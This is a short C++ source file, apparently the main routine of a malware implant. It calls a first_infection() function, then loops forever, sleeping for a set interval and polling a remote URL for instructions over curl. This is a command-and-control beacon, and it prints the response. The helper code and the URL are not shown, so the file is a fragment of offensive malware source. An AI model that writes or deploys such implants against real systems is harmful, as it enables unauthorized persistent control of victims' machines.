#include "request.h"
int main(int argc, char *argv[]) {
    first_infection();
    

    //Loop for implant to check
    while(1) {

        std::this_thread::sleep_for (std::chrono::seconds(CALLBACK_INTERVAL));
        std::string resp = curl_get(URL, INSTR);
        std::cout << "running" << std::endl;
        std::cout << resp << std::endl;
    }



    return 0;
}

